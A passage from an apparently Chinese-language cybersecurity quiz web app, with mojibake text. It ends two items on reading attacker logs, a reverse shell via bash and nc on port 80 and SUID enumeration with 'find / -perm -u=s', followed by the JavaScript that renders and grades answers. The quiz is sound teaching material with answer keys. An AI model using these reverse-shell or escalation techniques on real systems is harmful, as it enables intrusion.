              { "idx": 0, "status": "wrong", "reason": "å–®ç´”å‹˜æŸ¥ Port ä¸éœ€å•Ÿå‹• `bash -i`ï¼Œé€šå¸¸ç”¨ `nc -z` æˆ– `curl`ã€‚" },
              { "idx": 1, "status": "wrong", "reason": "è®€å–æª”æ¡ˆæ˜¯ç”¨ `cat` æˆ– `less`ï¼Œä¸æ˜¯åŸ·è¡Œè©²ç¨‹å¼ã€‚" },
              { "idx": 2, "status": "correct", "reason": "ç‰¹å¾µå®Œå…¨ç¬¦åˆï¼šShell + ç¶²è·¯é€£ç·š + å°å‘ = é ç«¯æ§åˆ¶ (Reverse Shell)ã€‚" },
              { "idx": 3, "status": "wrong", "reason": "æŸ¥ç‰ˆæœ¬èˆ‡ç¶²è·¯é€£ç·šå·¥å…· nc ç„¡ç›´æ¥é—œè¯ã€‚" }
          ],
          "supplement": {
              "content": "æ”»æ“Šè€…é¸æ“‡ Port 80 æ˜¯ç‚ºäº†å½è£æˆæ­£å¸¸çš„ Web æµé‡ï¼Œé™ä½è¢«é˜²ç«ç‰†é˜»æ“‹çš„æ©Ÿç‡ã€‚",
              "definition": "Reverse Shellï¼šTarget connects back to Attacker. Bind Shellï¼šAttacker connects to Target."
          },
          "analogy": "Bind Shell æ˜¯ä½ é–‹é–€ç­‰å°å·é€²ä¾†ï¼›Reverse Shell æ˜¯ä½ æ‰“é›»è©±è«‹å°å·æ•™ä½ åšäº‹ã€‚",
          "mnemonics": "bash åŠ  ncï¼Œå…«æˆæ˜¯åå½ˆ shellï¼›å—å®³è€…ä¸»å‹•é€£å‡ºï¼Œå°±æ˜¯åå‘é€£ç·šã€‚",
          "traps": {
              "blind_spot": "çœ‹åˆ° Port 80 å°±ä»¥ç‚ºæ˜¯ç€è¦½ç¶²é ã€‚",
              "guide": "ä¸è¦åªçœ‹ Portï¼Œè¦çœ‹æŒ‡ä»¤çµ„åˆã€‚`bash` + `nc` æ˜¯å±éšªè¨Šè™Ÿã€‚"
          },
          "self_check": [
              { "q": "ç‚ºä»€éº¼ä¸ç›´æ¥é€£é€²å» (Bind Shell) å°±å¥½ï¼Ÿ", "a": "å› ç‚ºä¼æ¥­é˜²ç«ç‰†é€šå¸¸æœƒå°é–å¤–éƒ¨ä¸»å‹•é€£å…¥çš„é€£ç·š (Inbound Block)ï¼Œç›´æ¥é€£æœƒå¤±æ•—ã€‚" },
              { "q": "é™¤äº† ncï¼Œé‚„æœ‰ä»€éº¼å·¥å…·å¯ä»¥åš Reverse Shellï¼Ÿ", "a": "å¾ˆå¤šï¼Œä¾‹å¦‚ Python, PHP, Perl, Ruby ç”šè‡³ Powershell éƒ½å¯ä»¥å¯«å‡ºé¡ä¼¼åŠŸèƒ½çš„è…³æœ¬ã€‚" }
          ]
      }
    },
    {
      "id": 36,
      "tag": "tech",
      "tagName": "Linux ææ¬Šåµå¯Ÿ",
      "type": "multi", // è¤‡é¸é¡Œ
      "text": "æ—¥èªŒä¸­å‡ºç¾ã€Œfind / -perm -u=s ...ã€ï¼Œè«‹å•æ”»æ“Šè€…åŸ·è¡Œæ­¤æŒ‡ä»¤ã€Œæœ€ä¸å¯èƒ½ã€åšä¸‹åˆ—å“ªäº›æ”»æ“Šè¡Œç‚ºï¼Ÿï¼ˆè¤‡é¸ï¼‰",
      "options": [
        "å°‹æ‰¾æœ‰è¢«è¨­å®š setuid çš„æª”æ¡ˆï¼Œå˜—è©¦æå‡æˆç‚º root æ¬Šé™",
        "å°‹æ‰¾æœ‰è¢«è¨­å®š setgid çš„æª”æ¡ˆï¼Œå˜—è©¦æå‡æˆç‚º root æ¬Šé™",
        "å°‹æ‰¾æœ‰è¢«è¨­å®š sticky bit çš„ç›®éŒ„ï¼Œå˜—è©¦åˆ©ç”¨æª”æ¡ˆææ¬Š",
        "å°‹æ‰¾æœ‰è¢«è¨­å®šç‚º root:root çš„æª”æ¡ˆèˆ‡ç›®éŒ„ï¼Œç¢ºèªæ©Ÿæ•è³‡æ–™ä½ç½®"
      ],
      "correctIndex": [1, 2, 3], // é¡Œç›®å•ã€Œæœ€ä¸å¯èƒ½ã€
      "explanation": {
          "keywords": [
              { "word": "find /", "desc": "å¾æ ¹ç›®éŒ„é–‹å§‹æœå°‹" },
              { "word": "-perm", "desc": "æœå°‹ç‰¹å®šæ¬Šé™ (Permission)" },
              { "word": "-u=s", "desc": "User æ¬Šé™è¨­ç‚º SetUID (s)" }
          ],
          "translation": "ã€Œç³»çµ±è«‹å¹«æˆ‘æ‰¾ä¸€ä¸‹ï¼Œå…¨é›»è…¦è£¡é¢æœ‰å“ªäº›æª”æ¡ˆæ˜¯è¢«è¨­å®šäº† SUID ç‰¹æ¬Šçš„ï¼Ÿã€",
          "logic": {
              "steps": [
                  "æŒ‡ä»¤æŒ‡å®šåƒæ•¸ `-u=s`ï¼Œé€™æ˜ç¢ºæ˜¯æ‰¾ SetUID (SUID) æª”æ¡ˆã€‚",
                  "SUID çš„åŠŸèƒ½æ˜¯ï¼šåŸ·è¡Œè©²æª”æ¡ˆæ™‚ï¼Œæš«æ™‚æ“æœ‰ã€Œæª”æ¡ˆæ“æœ‰è€…ï¼ˆé€šå¸¸æ˜¯ rootï¼‰ã€çš„æ¬Šé™ã€‚",
                  "æ”»æ“Šè€…æ‰¾é€™å€‹æ˜¯ç‚ºäº†åˆ©ç”¨é€™äº›æª”æ¡ˆçš„æ¼æ´é€²è¡Œã€Œæ¬Šé™æå‡ã€ã€‚",
                  "é¡Œç›®å•ã€Œæœ€ä¸å¯èƒ½ã€ï¼Œæ‰€ä»¥æˆ‘å€‘è¦é¸ã€Œè·Ÿ SUID ç„¡é—œã€çš„é¸é …ã€‚"
              ],
              "principle": "SUID (Set User ID)ï¼šLinux ç‰¹æ®Šæ¬Šé™ä½å…ƒã€‚ä¾‹å¦‚ `passwd` æŒ‡ä»¤éœ€è¦ root æ¬Šé™æ”¹å¯†ç¢¼ï¼Œæ‰€ä»¥å®ƒæœ‰ SUIDï¼Œè®“ä¸€èˆ¬ä½¿ç”¨è€…åŸ·è¡Œæ™‚ç¬é–“è®Šèº« rootã€‚",
              "example": "SUID å°±åƒä¸€æŠŠã€Œå°šæ–¹å¯¶åŠã€ï¼Œè¦‹åŠå¦‚è¦‹çš‡ä¸Šã€‚æ‹¿åˆ°é€™æŠŠåŠï¼ˆåŸ·è¡Œé€™å€‹æª”ï¼‰ï¼Œä½ æš«æ™‚å°±æ˜¯çš‡ä¸Šï¼ˆRootï¼‰ã€‚"
          },
          "options_analysis": [
              { "idx": 0, "status": "wrong", "reason": "é€™æ˜¯è©²æŒ‡ä»¤çš„å”¯ä¸€ç›®çš„ï¼ˆæ‰¾ setuidï¼‰ï¼Œæ‰€ä»¥æ˜¯ã€Œæœ€å¯èƒ½ã€ï¼Œä¸é¸ã€‚" },
              { "idx": 1, "status": "correct", "reason": "æ‰¾ setgid éœ€è¦ç”¨ `-g=s` åƒæ•¸ã€‚æ­¤æŒ‡ä»¤æ‰¾ä¸åˆ°ã€‚" },
              { "idx": 2, "status": "correct", "reason": "æ‰¾ sticky bit éœ€è¦ç”¨ `+t` æˆ–æ¬Šé™ç¢¼ 1000ã€‚æ­¤æŒ‡ä»¤æ‰¾ä¸åˆ°ã€‚" },
              { "idx": 3, "status": "correct", "reason": "æ‰¾ root æ“æœ‰è€…éœ€è¦ç”¨ `-user root` åƒæ•¸ã€‚æ­¤æŒ‡ä»¤åªçœ‹æ¬Šé™ä½å…ƒï¼Œä¸çœ‹æ“æœ‰è€…ã€‚" }
          ],
          "supplement": {
              "content": "æ¬Šé™ä»£è™Ÿå°ç…§ï¼šSUID (4000, u+s), SGID (2000, g+s), Sticky (1000, +t)ã€‚",
              "definition": "Privilege Escalation (ææ¬Š)ï¼šå¾ä½æ¬Šé™å¸³è™Ÿï¼ˆå¦‚ www-dataï¼‰æ”»æ“Šæ¼æ´è®Šæˆé«˜æ¬Šé™å¸³è™Ÿï¼ˆå¦‚ rootï¼‰çš„éç¨‹ã€‚"
          },
          "analogy": "æŒ‡ä»¤æ˜¯ã€Œæ‰¾å°šæ–¹å¯¶åŠ(-u=s)ã€ï¼Œæ‰€ä»¥ä¸å¯èƒ½æ˜¯åœ¨ã€Œæ‰¾å…æ­»é‡‘ç‰Œ(-g=s)ã€æˆ–ã€Œæ‰¾ç‰ç’½(-user root)ã€ã€‚",
          "mnemonics": "-u æ˜¯ User (SUID)ï¼Œ-g æ˜¯ Group (SGID)ï¼›é¡Œç›®å•ä¸å¯èƒ½ï¼ŒæŠŠç„¡é—œçš„éƒ½å‹¾èµ·ä¾†ã€‚",
          "traps": {
              "blind_spot": "çœ‹åˆ° root é¸é …å°±è¦ºå¾—å¾ˆå±éšªï¼Œä»¥ç‚ºæ˜¯é§­å®¢åœ¨æ‰¾çš„ã€‚é›–ç„¶é§­å®¢ç¢ºå¯¦æƒ³æ‰¾ root æª”ï¼Œä½†ã€Œé€™å€‹ç‰¹å®šæŒ‡ä»¤ã€åšä¸åˆ°ã€‚",
              "guide": "ç²¾ç¢ºå°æ‡‰æŒ‡ä»¤åƒæ•¸ï¼šu=s å°±æ˜¯ SUIDï¼Œå…¶ä»–éƒ½åˆ¥è…¦è£œã€‚"
          },
          "self_check": [
              { "q": "SUID æª”æ¡ˆç‚ºä»€éº¼å±éšªï¼Ÿ", "a": "å› ç‚ºå¦‚æœè©²ç¨‹å¼å¯«å¾—ä¸å¥½ï¼ˆæœ‰æ¼æ´ï¼‰ï¼Œæ”»æ“Šè€…å°±èƒ½åˆ©ç”¨å®ƒä»¥ Root èº«åˆ†åŸ·è¡Œæƒ¡æ„ä»£ç¢¼ã€‚" },
              { "q": "å¦‚ä½•é˜²ç¦¦ SUID ææ¬Šï¼Ÿ", "a": "å®šæœŸæƒæç³»çµ±ä¸­ä¸å¿…è¦çš„ SUID æª”æ¡ˆä¸¦ç§»é™¤æ¬Šé™ï¼›æ›è¼‰åˆ†å‰²å€æ™‚ä½¿ç”¨ `nosuid` åƒæ•¸ã€‚" }
          ]
      }
    }
  ]
};

// ==========================================
// 2. æ ¸å¿ƒé‚è¼¯ (App Logic)
// ==========================================

const state = {
    results: new Array(quizData.questions.length).fill(null), // null: æœªç­”, true: å°, false: éŒ¯
    currentTab: 0
};

// åˆå§‹åŒ–
function init() {
    renderTabs();
    renderQuestions();
    updateProgress();
    
    // é è¨­é¡¯ç¤ºç¬¬ä¸€é¡Œ
    switchTab(0);
}

// æ¸²æŸ“åˆ†é ç±¤
function renderTabs() {
    const container = document.getElementById('tabs-container');
    container.innerHTML = quizData.questions.map((q, index) => `
        <button class="tab-btn" id="tab-${index}" onclick="switchTab(${index})">
            <span>Q${q.id}</span>
            <span class="status-icon"></span>
        </button>
    `).join('');
}

// Fisher-Yates Shuffle
function shuffle(array) {
    let currentIndex = array.length, randomIndex;
    // è¤‡è£½é™£åˆ—ä»¥å…ä¿®æ”¹åŸå§‹è³‡æ–™
    const newArray = [...array]; 
    while (currentIndex != 0) {
        randomIndex = Math.floor(Math.random() * currentIndex);
        currentIndex--;
        [newArray[currentIndex], newArray[randomIndex]] = [newArray[randomIndex], newArray[currentIndex]];
    }
    return newArray;
}

// è™•ç†é¡Œç›®æ–‡å­—ä¸­çš„é—œéµå­—å¼·èª¿
function highlightKeywords(text) {
    const negativeWords = ["ä¸æ­£ç¢º", "ä¸æ˜¯", "éŒ¯èª¤", "æœ€ä¸é©ç”¨", "æœ€ä¸å¯èƒ½"];
    let processedText = text;
    negativeWords.forEach(word => {
        const regex = new RegExp(word, 'g');
        processedText = processedText.replace(regex, `<span class="highlight-negative">${word}</span>`);
    });
    return processedText;
}

// æ¸²æŸ“é¡Œç›®å¡ç‰‡
function renderQuestions() {
    const container = document.getElementById('questions-container');
    
    container.innerHTML = quizData.questions.map((q, index) => {
        // 1. è™•ç†é¸é …éš¨æ©ŸåŒ–
        let optionsObj = q.options.map((opt, i) => ({ text: opt, originalIndex: i }));
        optionsObj = shuffle(optionsObj);
        
        // 2. æ±ºå®š Tag é¡è‰² Class
        const tagClass = `tag-${q.tag}`;

        // 3. æº–å‚™è©³è§£å…§å®¹
        const exp = q.explanation;
        
        // æ¸²æŸ“ HTML
        return `
        <div class="card" id="card-${index}">
            <div class="q-header">
                <span class="q-tag ${tagClass}">${q.tagName}</span>
                <span style="color: #999; font-size: 0.9rem;">${q.type === 'multi' ? 'è¤‡é¸é¡Œ' : 'å–®é¸é¡Œ'}</span>
            </div>
            
            <div class="q-text">
                ${q.id}. ${highlightKeywords(q.text)}
            </div>

            <div class="options-area" id="options-area-${index}" data-type="${q.type}">
                ${optionsObj.map((opt, i) => {
                    let isCorrect = false;
                    if (Array.isArray(q.correctIndex)) {
                        isCorrect = q.correctIndex.includes(opt.originalIndex);
                    } else {
                        isCorrect = q.correctIndex === opt.originalIndex;
                    }
                    const char = String.fromCharCode(65 + i);
                    return `
                    <label class="option-label" data-correct="${isCorrect}">
                        <span class="opt-code">${char}</span>
                        <input type="${q.type === 'multi' ? 'checkbox' : 'radio'}" 
                               name="q-${index}" 
                               class="option-input" 
                               value="${i}">
                        <span>${opt.text}</span>
                    </label>
                    `;
                }).join('')}
            </div>

            <div class="action-area">
                <button class="btn btn-submit" id="submit-${index}" onclick="submitAnswer(${index})">é€å‡ºç­”æ¡ˆ</button>
                <button class="btn btn-retry" id="retry-${index}" onclick="resetQuestion(${index})">é‡æ–°ä½œç­”</button>
            </div>

            <div class="explain-section" id="explain-${index}">
                
                <!-- ç¬¬ä¸€æ­¥ï¼šæ‰¾é—œéµå­— -->
                <div class="step-block">
                    <div class="step-title">ç¬¬ä¸€æ­¥ï¼šæ‰¾é—œéµå­—</div>
                    <div class="step-content">
                        ${exp.keywords.map(k => `<div><span class="keyword-badge">${k.word}</span> ${k.desc}</div>`).join('')}
                    </div>
                </div>

                <!-- ç¬¬äºŒæ­¥ï¼šç™½è©±ç¿»è­¯ -->
                <div class="step-block">
                    <div class="step-title">ç¬¬äºŒæ­¥ï¼šç™½è©±ç¿»è­¯</div>
                    <div class="step-content highlight-box">
                        ${exp.translation}
                    </div>
                </div>

                <!-- ç¬¬ä¸‰æ­¥ï¼šè§£é¡Œæ€è·¯ -->
                <div class="step-block">
                    <div class="step-title">ç¬¬ä¸‰æ­¥ï¼šè§£é¡Œæ€è·¯</div>
                    <div class="step-content">
                        <strong>é‚è¼¯æ‹†è§£ï¼š</strong>
                        <ul>${exp.logic.steps.map(s => `<li>${s}</li>`).join('')}</ul>
                        <div style="margin-top:10px;"><strong>åŸç†èˆ‡è¦å‰‡ï¼š</strong>${exp.logic.principle}</div>
                        <div style="margin-top:10px; color:#2980b9;"><strong>ç”Ÿæ´»ä¾‹å­ï¼š</strong>${exp.logic.example}</div>
                    </div>
                </div>

                <!-- ç¬¬å››æ­¥ï¼šé¸é …åˆ†æ -->
                <div class="step-block">
                    <div class="step-title">ç¬¬å››æ­¥ï¼šé¸é …åˆ†æ</div>
                    <div class="step-content">
                        <table class="option-analysis-table">
                            ${exp.options_analysis.map(oa => `
                            <tr>
                                <td class="oa-label">(${String.fromCharCode(65 + oa.idx)})</td>
                                <td>
                                    <span class="oa-status ${oa.status === 'correct' ? 'oa-correct' : 'oa-wrong'}">${oa.status === 'correct' ? 'æ­£è§£' : 'éŒ¯èª¤'}</span>
                                    ${oa.reason}
                                </td>
                            </tr>
                            `).join('')}
                        </table>
                    </div>
                </div>

                <!-- è§€å¿µè£œå……èˆ‡å»¶ä¼¸ -->
                <div class="step-block">
                    <div class="step-title">è§€å¿µè£œå……èˆ‡å»¶ä¼¸</div>
                    <div class="step-content">
                        <p>${exp.supplement.content}</p>
                        <div class="highlight-box" style="background:#eaf2f8; border-left-color:#3498db;">
                            <strong>å®šç¾©ï¼š</strong>${exp.supplement.definition}
                        </div>
                    </div>
                </div>

                <!-- è§¸é¡æ—é€š -->
                <div class="step-block">
                    <div class="step-title">è§¸é¡æ—é€šï¼ˆèˆ‰ä¸€åä¸‰ï¼‰</div>
                    <div class="step-content">
                        ${exp.analogy}
                    </div>
                </div>

                <!-- è¨˜æ†¶å£è¨£ -->
                <div class="step-block" style="border-left: 5px solid #f1c40f;">
                    <div class="step-title" style="color: #d35400; border-color: #f1c40f;">è¨˜æ†¶å£è¨£</div>
                    <div class="step-content" style="font-size: 1.1rem; font-weight: bold; color: #d35400;">
                        ${exp.mnemonics}
                    </div>
                </div>

                <!-- å¸¸è¦‹é™·é˜± -->
                <div class="step-block">
                    <div class="step-title">å¸¸è¦‹é™·é˜±</div>
                    <div class="step-content">
                        <p><strong>å¿ƒç†ç›²é»ï¼š</strong>${exp.traps.blind_spot}</p>
                        <p><strong>é¿å‘æŒ‡å—ï¼š</strong>${exp.traps.guide}</p>
                    </div>
                </div>

                <!-- è‡ªæˆ‘æª¢æ¸¬ -->
                <div class="self-check-container">
                    <div class="self-check-title">è‡ªæˆ‘æª¢æ¸¬</div>
                    ${exp.self_check.map((sc, scIdx) => `
                    <div class="sc-item">
                        <div class="sc-question">Q${scIdx+1}: ${sc.q}</div>
                        <button class="sc-answer-btn" onclick="toggleSelfAnswer(this)">é¡¯ç¤ºç­”æ¡ˆ</button>
                        <div class="sc-answer-content">A: ${sc.a}</div>
                    </div>
                    `).join('')}
                </div>

            </div>
        </div>
        `;
    }).join('');
    
    // ç¶å®šé¸é …é»æ“Šäº‹ä»¶
    bindOptionEvents();
}

function bindOptionEvents() {
    document.querySelectorAll('.option-label').forEach(label => {
        label.addEventListener('click', function(e) {
            if (this.classList.contains('disabled')) return;
            
            const input = this.querySelector('input');
            const container = this.closest('.options-area');
            const type = container.dataset.type;

            if (type === 'single') {
                container.querySelectorAll('.option-label').forEach(l => l.classList.remove('selected'));
                this.classList.add('selected');
                input.checked = true;
            } else {
                if (input.checked) {
                    this.classList.add('selected');
                } else {
                    this.classList.remove('selected');
                }
            }
        });
    });
}

// é¡¯ç¤º/éš±è—è‡ªæˆ‘æª¢æ¸¬ç­”æ¡ˆ
function toggleSelfAnswer(btn) {
    const content = btn.nextElementSibling;
    if (content.style.display === 'block') {
        content.style.display = 'none';
        btn.innerText = 'é¡¯ç¤ºç­”æ¡ˆ';
        btn.style.background = '#95a5a6';
    } else {
        content.style.display = 'block';
        btn.innerText = 'éš±è—ç­”æ¡ˆ';
        btn.style.background = '#2ecc71';
    }
}

// åˆ‡æ›é¡Œç›® Tab
function switchTab(index) {
    state.currentTab = index;
    
    document.querySelectorAll('.tab-btn').forEach((btn, i) => {
        if (i === index) btn.classList.add('active');
        else btn.classList.remove('active');
    });

    document.querySelectorAll('.card').forEach((card, i) => {
        if (i === index) card.classList.add('active');
        else card.classList.remove('active');
    });

    const container = document.querySelector('.group-scenario');
    const offset = 100;
    const bodyRect = document.body.getBoundingClientRect().top;
    const elementRect = container.getBoundingClientRect().bottom;
    const elementPosition = elementRect - bodyRect;
    const offsetPosition = elementPosition + 20;

    window.scrollTo({
        top: offsetPosition,
        behavior: 'smooth'
    });
}

// æäº¤ç­”æ¡ˆåˆ¤å®š
function submitAnswer(index) {
    const optionsArea = document.getElementById(`options-area-${index}`);
    const inputs = optionsArea.querySelectorAll('input');
    const labels = optionsArea.querySelectorAll('.option-label');
    const submitBtn = document.getElementById(`submit-${index}`);
    const retryBtn = document.getElementById(`retry-${index}`);
    const explainSec = document.getElementById(`explain-${index}`);
    
    let isCorrect = true;
    let hasSelection = false;

    inputs.forEach(input => {
        if (input.checked) hasSelection = true;
    });

    if (!hasSelection) {
        alert("è«‹å…ˆé¸æ“‡ä¸€å€‹é¸é …ï¼");
        return;
    }

    labels.forEach(label => {
        label.classList.add('disabled');
        const input = label.querySelector('input');
        input.disabled = true;
        
        const isTarget = label.dataset.correct === "true";
        const isSelected = input.checked;

        if (isTarget) {
            label.classList.add('correct');
            if (!isSelected) isCorrect = false; 
        } else if (isSelected) {
            label.classList.add('wrong');
            isCorrect = false; 
        }
    });

    state.results[index] = isCorrect;
    updateTabStatus(index, isCorrect);
    updateProgress();

    submitBtn.style.display = 'none';
    retryBtn.style.display = 'inline-block';
    
    explainSec.style.display = 'block';
    explainSec.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

// æ›´æ–° Tab ç‹€æ…‹é¡è‰²èˆ‡åœ–ç¤º
function updateTabStatus(index, isCorrect) {
    const tab = document.getElementById(`tab-${index}`);
    const icon = tab.querySelector('.status-icon');
    
    tab.classList.remove('correct', 'wrong');
    if (isCorrect) {
        tab.classList.add('correct');
        icon.innerText = "âœ“";
    } else {
        tab.classList.add('wrong');
        icon.innerText = "âœ•";
    }
}

// æ›´æ–°é€²åº¦æ¢
function updateProgress() {
    const completed = state.results.filter(r => r !== null).length;
    const total = state.results.length;
    
    document.getElementById('completed-count').innerText = completed;
    document.getElementById('total-count').innerText = total;
    
    const percent = (completed / total) * 100;
    document.getElementById('global-progress').style.width = `${percent}%`;
}

// å–®é¡Œé‡ç½®
function resetQuestion(index) {
    const optionsArea = document.getElementById(`options-area-${index}`);
    const submitBtn = document.getElementById(`submit-${index}`);
    const retryBtn = document.getElementById(`retry-${index}`);
    const explainSec = document.getElementById(`explain-${index}`);
    const tab = document.getElementById(`tab-${index}`);
    const icon = tab.querySelector('.status-icon');

    state.results[index] = null;
    updateProgress();

    tab.classList.remove('correct', 'wrong');
    icon.innerText = "";

    const labels = optionsArea.querySelectorAll('.option-label');
    labels.forEach(label => {
        label.classList.remove('disabled', 'selected', 'correct', 'wrong');
        const input = label.querySelector('input');
        input.checked = false;
        input.disabled = false;
    });

    submitBtn.style.display = 'inline-block';
    retryBtn.style.display = 'none';
    explainSec.style.display = 'none';

    document.getElementById(`card-${index}`).scrollIntoView({ behavior: 'smooth', block: 'center' });
}

window.onload = init;

</script>

</body>
</html>